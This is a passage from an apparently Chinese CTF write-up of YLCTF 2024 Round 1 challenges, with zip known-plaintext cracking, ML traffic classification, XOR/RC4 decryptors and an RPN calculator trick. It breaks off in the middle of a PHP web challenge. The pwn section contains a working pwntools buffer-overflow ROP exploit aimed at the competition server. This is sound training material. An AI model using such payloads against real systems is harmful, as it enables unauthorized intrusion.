<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">files, zfile</span>):<br>    <span class="hljs-comment"># 创建一个新的 ZIP 文件</span><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zfile, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        <br>            zipf.write(file, os.path.basename(file), compress_type=zipfile.ZIP_DEFLATED)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    files = [<span class="hljs-string">&#x27;build.py&#x27;</span>]  <br>    zfile = <span class="hljs-string">&#x27;crack2.zip&#x27;</span><br>    create(files, zfile)<br></code></pre></td></tr></table></figure>
<p>pyadminzip我本地的轮子有问题就用了zipfile需要测试几次才可以进行明文攻击，等待几分钟直接解压里面有flag.docx，docx也是一种zip文件形式，改成zip里面有个图片得到flag</p>
<p><img src="/../../images/ylctf/2024/crack.png" srcset="/img/loading.gif" lazyload alt="crack"></p>
<h5 id="round-1-trafficdet"><a class="markdownIt-Anchor" href="#round-1-trafficdet"></a> [Round 1] trafficdet</h5>
<p>是个ai模型分析，把要求告诉chatgpt上传对应的文件然后叫他按形式写出解密脚本就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_and_preprocess_data</span>(<span class="hljs-params">train_file, test_file</span>):<br>    <span class="hljs-comment"># Load training data</span><br>    train_data = pd.read_csv(train_file)<br>    train_data = train_data.dropna()<br><br>    <span class="hljs-comment"># Separate features and labels</span><br>    X = train_data.drop(columns=[<span class="hljs-string">&#x27;Label&#x27;</span>])<br>    y = train_data[<span class="hljs-string">&#x27;Label&#x27;</span>]<br><br>    <span class="hljs-comment"># Load test data</span><br>    test_data = pd.read_csv(test_file)<br><br>    <span class="hljs-keyword">return</span> X, y, test_data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_model</span>(<span class="hljs-params">X_train, y_train, n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span></span>):<br>    model = RandomForestClassifier(n_estimators=n_estimators, random_state=random_state)<br>    model.fit(X_train, y_train)<br>    <span class="hljs-keyword">return</span> model<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_model</span>(<span class="hljs-params">model, X_val, y_val</span>):<br>    y_pred = model.predict(X_val)<br>    accuracy = accuracy_score(y_val, y_pred)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Model Accuracy: <span class="hljs-subst">&#123;accuracy:<span class="hljs-number">.2</span>f&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> y_pred<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_predictions</span>(<span class="hljs-params">model, X_test</span>):<br>    <span class="hljs-keyword">return</span> model.predict(X_test)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_results</span>(<span class="hljs-params">predictions, output_file</span>):<br>    result = pd.DataFrame(&#123;<span class="hljs-string">&#x27;Label&#x27;</span>: predictions&#125;)<br>    result.index += <span class="hljs-number">1</span>  <span class="hljs-comment"># Start index at 1</span><br>    result.index.name = <span class="hljs-string">&#x27;id&#x27;</span>  <span class="hljs-comment"># Rename index to &#x27;id&#x27;</span><br>    result.to_csv(output_file, index=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># Ensure the index is saved</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Load and preprocess data</span><br>    X, y, test_data = load_and_preprocess_data(<span class="hljs-string">&#x27;train.csv&#x27;</span>, <span class="hljs-string">&#x27;test.csv&#x27;</span>)<br><br>    <span class="hljs-comment"># Split the training data into training and validation sets</span><br>    X_train, X_val, y_train, y_val = train_test_split(X, y, test_size=<span class="hljs-number">0.1</span>, random_state=<span class="hljs-number">42</span>)<br><br>    <span class="hljs-comment"># Train the model</span><br>    model = train_model(X_train, y_train)<br><br>    <span class="hljs-comment"># Evaluate the model</span><br>    evaluate_model(model, X_val, y_val)<br><br>    <span class="hljs-comment"># Make predictions on the test data</span><br>    test_preds = make_predictions(model, test_data)<br><br>    <span class="hljs-comment"># Save the results</span><br>    save_results(test_preds, <span class="hljs-string">&#x27;result.csv&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h5 id="round-1-whatmusic"><a class="markdownIt-Anchor" href="#round-1-whatmusic"></a> [Round 1] whatmusic</h5>
<p>可以发现password单独解压，010研究是图片逆转写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
<p>然后导入010改文件尾，得到图片，然后还需要镜像一下，再进行在线网站的镜像处理得到password，然后进行解压</p>
<p><img src="/../../images/ylctf/2024/result.png" srcset="/img/loading.gif" lazyload alt="result"></p>
<p>然后就没有思路了，给了hint也看不懂，信息收集后发现</p>
<p><img src="/../../images/ylctf/2024/music1.png" srcset="/img/loading.gif" lazyload alt="music1"></p>
<p>死去的记忆痛击我，在今年的iscc里面就有一题是github上面的lyra项目转音频得到wav的题目，主要是要搭建环境，我这里用了香港的vps搭建版本ubuntu20,参考文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36959443/article/details/116136965">Lyra编码器基础环境搭建_lyra dajian-CSDN博客</a></p>
<p><img src="/../../images/ylctf/2024/music2.png" srcset="/img/loading.gif" lazyload alt="music2"></p>
<p>环境构造搭好之后用xftp传入文件然后得到wav,多听几遍得到了flag</p>
<p><img src="/../../images/ylctf/2024/music3.png" srcset="/img/loading.gif" lazyload alt="music3"></p>
<h4 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h4>
<h5 id="round-1-giaopwn"><a class="markdownIt-Anchor" href="#round-1-giaopwn"></a> [Round 1] giaopwn</h5>
<p><img src="/../../images/ylctf/2024/giaopwn.png" srcset="/img/loading.gif" lazyload alt="giaopwn"></p>
<p>有nx保护</p>
<p>vuln有溢出点，查一下是有system和cat flag的</p>
<p><img src="/../../images/ylctf/2024/giaopwn2.png" srcset="/img/loading.gif" lazyload alt="giaopwn2"></p>
<p><img src="/../../images/ylctf/2024/giao.png" srcset="/img/loading.gif" lazyload alt="giao"></p>
<p>利用寄存器rbi放入地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">44805</span>)<br><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>)+p64(<span class="hljs-number">0x400743</span>)+p64(<span class="hljs-number">0x601048</span>)+p64(<span class="hljs-number">0x4006D2</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/giao1.png" srcset="/img/loading.gif" lazyload alt="giao1"></p>
<h4 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h4>
<h5 id="round1xor"><a class="markdownIt-Anchor" href="#round1xor"></a> [round1]xor</h5>
<p>简单测试一下发现有upx，脱壳一下</p>
<p><img src="/../../images/ylctf/2024/xor.png" srcset="/img/loading.gif" lazyload alt="xor"></p>
<p>分析一下简单的异或直接gpt梭个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted_bytes = [<br>    <span class="hljs-number">0x45</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2F</span>,<br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x7D</span>,<br>    <span class="hljs-number">0x29</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x2B</span>,<br>    <span class="hljs-number">0x31</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x79</span>,<br>    <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x2A</span>,<br>    <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x1C</span><br>]<br><br><span class="hljs-comment"># 解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_bytes</span>):<br>    decrypted_bytes = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> encrypted_bytes:<br>        decrypted_byte = byte ^ <span class="hljs-number">0x1C</span>  <br>        decrypted_bytes.append(decrypted_byte)<br>    <span class="hljs-keyword">return</span> decrypted_bytes<br><br>decrypted_values = decrypt(encrypted_bytes)<br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decrypted_values)<br><span class="hljs-built_in">print</span>(decrypted_string)<br></code></pre></td></tr></table></figure>
<h5 id="round1ezgo"><a class="markdownIt-Anchor" href="#round1ezgo"></a> [round1]ezgo</h5>
<p>ida看一下加密逻辑</p>
<p><img src="/../../images/ylctf/2024/ezgo.png" srcset="/img/loading.gif" lazyload alt="ezgo"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted_bytes = [<br>    <span class="hljs-number">108</span>, <span class="hljs-number">122</span>, <span class="hljs-number">116</span>, <span class="hljs-number">108</span>, <span class="hljs-number">127</span>, <span class="hljs-number">65</span>, <span class="hljs-number">94</span>, <span class="hljs-number">90</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">15</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">118</span>, <span class="hljs-number">110</span>, <span class="hljs-number">34</span>, <span class="hljs-number">115</span>, <span class="hljs-number">112</span>, <span class="hljs-number">36</span>, <span class="hljs-number">101</span>,<br>    <span class="hljs-number">125</span>, <span class="hljs-number">46</span>, <span class="hljs-number">121</span>, <span class="hljs-number">47</span>, <span class="hljs-number">96</span>, <span class="hljs-number">119</span>, <span class="hljs-number">119</span>, <span class="hljs-number">53</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>,<br>    <span class="hljs-number">50</span>, <span class="hljs-number">101</span>, <span class="hljs-number">96</span>, <span class="hljs-number">100</span>, <span class="hljs-number">110</span>, <span class="hljs-number">59</span>, <span class="hljs-number">109</span>, <span class="hljs-number">57</span>, <span class="hljs-number">98</span>, <span class="hljs-number">56</span>,<br>    <span class="hljs-number">57</span>, <span class="hljs-number">56</span>, <span class="hljs-number">34</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted</span>):<br>    decrypted = []<br>    <span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted):<br>        decrypted_byte = byte ^ (i + <span class="hljs-number">53</span>) <br>        decrypted.append(decrypted_byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted)<br><br>decrypted_bytes = decrypt(encrypted_bytes)<br><span class="hljs-built_in">print</span>(decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
<h5 id="round1xorplus"><a class="markdownIt-Anchor" href="#round1xorplus"></a> [round1]xorplus</h5>
<p>ida打开分析一下是rc4的加密逻辑，没学会，一股脑把加密逻辑扔给claude帮我解密，出脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]) + <span class="hljs-number">1300</span>) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">S, data</span>):<br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(((byte - <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xFF</span>) ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    key = <span class="hljs-string">&quot;welcometoylctf&quot;</span><br>    encrypted_data = [<span class="hljs-number">0x91</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x65</span>,<br>                      <span class="hljs-number">0x3b</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x96</span>,<br>                      <span class="hljs-number">0x84</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xa6</span>]<br><br>    S = rc4_init(key)<br>    decrypted = rc4_crypt(S, encrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>, decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<h5 id="round-1calc"><a class="markdownIt-Anchor" href="#round-1calc"></a> [round 1]calc</h5>
<p>分析解密的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    <span class="hljs-type">double</span>* low;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-type">double</span>* top;<br>&#125; <span class="hljs-built_in">stack</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s)</span> &#123;<br>    s-&gt;size = <span class="hljs-number">100</span>;<br>    s-&gt;low = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>((<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>)) * <span class="hljs-number">100</span>);<br>    s-&gt;top = s-&gt;low;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s, <span class="hljs-type">double</span> e)</span> &#123;<br>    *(s-&gt;top) = e;<br>    s-&gt;top++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-built_in">stack</span>* s, <span class="hljs-type">double</span>* e)</span> &#123;<br>    s-&gt;top--;<br>    *e = *(s-&gt;top);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">stack</span> s;<br>    <span class="hljs-type">double</span> e, d;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">double</span> d, e;<br>    init(&amp;s);<br>    <span class="hljs-type">char</span> num[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input data, end of &#x27;#&#x27;&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>    <br>    <span class="hljs-keyword">while</span> (ch != <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>        <span class="hljs-keyword">while</span> (ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>            num[i] = ch;<br>            i++;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>            num[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            d = atof(num);<br>            push(&amp;s, d);<br>            i = <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">switch</span> (ch) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e + d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e - d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e * d);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    pop(&amp;s, &amp;d);<br>                    pop(&amp;s, &amp;e);<br>                    push(&amp;s, e / d);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;ch);<br>        <br>        <span class="hljs-keyword">if</span> (d == <span class="hljs-number">125</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, getenv(<span class="hljs-string">&quot;GZCTF_FLAG&quot;</span>));<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>程序使用逆波兰表示法（Reverse Polish Notation，RPN）进行计算。当栈顶的值达到 125 时，程序会输出 GZCTF_FLAG。</p>
<p>在栈顶产生值 125。所以能在栈顶产生 125 的 RPN 表达应该是有效的输入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">5 5 * 5 * #<br></code></pre></td></tr></table></figure>
<p>尝试了一些其他的没有成功这个是成功的</p>
<h4 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h4>
<h5 id="round-1-disal"><a class="markdownIt-Anchor" href="#round-1-disal"></a> [Round 1] Disal</h5>
<p>看不出东西，看看robots.txt，有提示去f1ag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag_is_so_beautiful.php&quot;</span>);<br><span class="hljs-variable">$a</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$key</span>=@<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]&#123;6&#125;/&#x27;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=@<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-number">999999</span> <span class="hljs-keyword">and</span> <span 